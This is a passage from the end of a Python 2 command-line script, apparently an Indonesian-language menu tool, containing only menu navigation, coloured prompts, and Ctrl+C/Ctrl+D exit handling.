                raw_input('%s{%s!%s} %sEnter returns to the menu%s:'%(putih,merah,putih,putih,merah))
                main()
            except KeyboardInterrupt:
                print '%s{%s•%s} %sCTRL+C %sDETECTED'%(putih,hijau,putih,merah,putih);exit()
            except EOFError:
                print '\n%s{%s•%s} %sCTRL+D %sDETECTED'%(putih,hijau,putih,merah,putih);exit()
        elif ab =='0' or ab =='00':
              print '%s{%s!%s} %sExit Menu%s!!'%(putih,merah,putih,putih,merah);exit()
        else:
            print '%s{%s!%s} %s%s%s Not Found'%(putih,merah,putih,merah,ab,putih)
            pilih()
    except KeyboardInterrupt:
        print '%s{%s•%s} %sCTRL+C %sDETECTED'%(putih,hijau,putih,merah,putih);exit()
    except EOFError:
        print '\n%s{%s•%s} %sCTRL+D %sDETECTED'%(putih,hijau,putih,merah,putih);exit()


if __name__ == '__main__':
    main()
